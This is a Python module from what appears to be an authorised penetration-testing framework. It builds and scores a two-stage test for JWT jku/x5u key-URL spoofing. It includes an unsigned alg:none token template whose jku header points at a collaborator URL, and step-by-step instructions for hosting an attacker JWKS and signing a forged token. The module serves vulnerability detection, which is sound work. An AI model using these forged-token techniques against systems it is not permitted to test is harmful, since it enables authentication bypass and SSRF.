"""C1-007 JWT jku/x5u spoofed key URL — two-stage tester.

Stage 1: submit an unsigned/unchanged token whose jku (or x5u) points at
a unique collaborator URL. A callback proves the server fetches key
material from attacker-controlled URLs — an SSRF-shaped finding on its
own, NOT forgery proof.
Stage 2: host a JWKS with your own public key at that URL, sign a forged
token with your private key, submit it. Acceptance = forgery.

PROPOSE-ONLY: builds token templates and key-hosting instructions. Key
generation and HTTP serving happen inside Engine.execute() after
authorization, never here.
"""
from __future__ import annotations

from typing import Dict, List

from .common import base_case, verdict

CARD = "C1-007"


def jku_battery(surface: dict) -> List[Dict]:
    """Build the two-stage jku/x5u test pair.

    surface: {"kind": "jwt", "name": str, "token_param": str,
              "collaborator": str, "header_param": "jku|x5u"}
    """
    header_param = surface.get("header_param", "jku")
    collab = surface.get("collaborator", "collaborator")
    token_param = surface.get("token_param", "Authorization")
    canary = "dh_jku"
    stage1 = base_case(
        "JKU-STAGE1-001", "jwt_jku", CARD, "send", canary,
        (f"Collaborator receives a request for the unique {header_param} "
         "URL — the server fetched key material from an attacker URL "
         "(SSRF-shaped finding; forgery NOT yet proven)."),
        f"No callback for the {header_param} URL — the parameter is "
        "ignored or allowlisted.",
        stage=1, header_param=header_param, token_param=token_param,
        unsigned_token_template=(
            '{"alg":"none","typ":"JWT","' + header_param +
            '":"https://{collaborator}/{canary}/jwks.json"}.'
            '{"sub":"probe"}.'
        ),
        unique_url=f"https://{collab}/{canary}/jwks.json",
        control="token with no jku/x5u (baseline rejection behavior)")
    stage2 = base_case(
        "JKU-STAGE2-001", "jwt_jku", CARD, "send", canary,
        "Forged token signed by the attacker's own key is ACCEPTED and "
        "forged claims are reflected server-side — full key-confusion.",
        "Callback occurred but the forged token is still rejected "
        "(e.g. kid must match a trusted key).",
        stage=2, header_param=header_param, token_param=token_param,
        depends_on="JKU-STAGE1-001",
        key_instructions=("Generate own RSA keypair; host JWKS with the "
                          "public key at the stage-1 URL; sign forged token "
                          "with the private key; submit via the same "
                          "parameter."),
        control="stage-1 callback must be confirmed before stage 2 runs")
    return [stage1, stage2]


def score_jku_stage1(case: dict, observation: dict) -> Dict:
    """Score the callback-detection stage.

    observation: {"collaborator_hits": [str], "canary_url": str}
    """
    hits = [str(h) for h in observation.get("collaborator_hits") or []]
    url = case.get("unique_url", observation.get("canary_url", ""))
    signals: List[str] = [f"collaborator_hits:{len(hits)}"]
    callback = bool(url) and any(url in h for h in hits)
    if callback:
        signals.append("server_fetched_attacker_key_url")
        return verdict("vulnerable", 0.88, signals, {
            "callback_observed": True,
            "unique_url_used": True,
            "forgery_proven": False,  # stage 1 never proves forgery
        })
    return verdict("not_vulnerable", 0.7,
                   signals + ["no_callback"], {
                       "callback_observed": False,
                       "unique_url_used": bool(url),
                       "forgery_proven": False,
                   })


def score_jku_stage2(case: dict, observation: dict) -> Dict:
    """Score the hosted-JWKS forgery stage.

    observation: {"stage1_callback": bool, "token_accepted": bool,
                  "forged_claims_reflected": bool}
    """
    signals: List[str] = []
    stage1 = bool(observation.get("stage1_callback", False))
    accepted = bool(observation.get("token_accepted", False))
    reflected = bool(observation.get("forged_claims_reflected", False))
    signals.append(f"stage1_callback:{stage1}")
    signals.append(f"forged_token_accepted:{accepted}")
    if not stage1:
        return verdict("inconclusive", 0.3, signals + ["stage1_unproven"], {
            "callback_observed": False,
            "unique_url_used": True,
            "forgery_proven": False,
        })
    if accepted and reflected:
        return verdict("vulnerable", 0.93,
                       signals + ["forged_claims_reflected"], {
                           "callback_observed": True,
                           "unique_url_used": True,
                           "forgery_proven": True,
                       })
    return verdict("not_vulnerable", 0.75,
                   signals + ["forged_token_rejected"], {
                       "callback_observed": True,
                       "unique_url_used": True,
                       "forgery_proven": False,
                   })
